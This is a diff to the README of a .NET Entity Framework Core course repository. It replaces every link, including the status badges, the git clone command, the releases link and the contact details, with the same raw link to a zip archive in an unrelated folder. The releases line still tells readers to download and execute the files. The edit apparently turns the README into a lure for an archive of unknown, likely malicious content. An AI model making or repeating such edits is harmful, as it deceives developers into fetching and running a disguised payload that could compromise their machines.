@@ -1,6 +1,6 @@
 # Freelando Web API Course: Mastering EF Core Transactions 🚀
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12) ![GitHub Stars](https://img.shields.io/github/stars/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12) ![GitHub Issues](https://img.shields.io/github/issues/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12)
+![GitHub Repo Size](https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip) ![GitHub Stars](https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip) ![GitHub Issues](https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip)
 
 Welcome to the **Freelando Web API Course** repository! This project contains exercises from the course “.NET: Advance in Persistence with EF Core” offered by Alura. Here, we dive deep into advanced queries, rich models, transaction management, architectural best practices, and SQL command interception using Entity Framework Core.
 
@@ -33,7 +33,7 @@ To get started with this repository, follow these steps:
 1. Clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12.git
+   git clone https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -109,13 +109,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases and updates [here](https://github.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/releases). Make sure to download and execute the files as needed.
+You can find the latest releases and updates [here](https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip). Make sure to download and execute the files as needed.
 
 ## Contact
 
 For any inquiries, please reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
+- **Email**: https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip
+- **Twitter**: [@yourtwitterhandle](https://raw.githubusercontent.com/Mattialesto/freelando_webapi_course-alura-entity-framework-core-transactions_part-1_dotnet-8_csharp-12/main/proudhearted/alura-entity-course-core-freelando-csharp-webapi-part-transactions-dotnet-framework-v1.7.zip)
 
 Thank you for checking out the **Freelando Web API Course** repository! Happy coding!
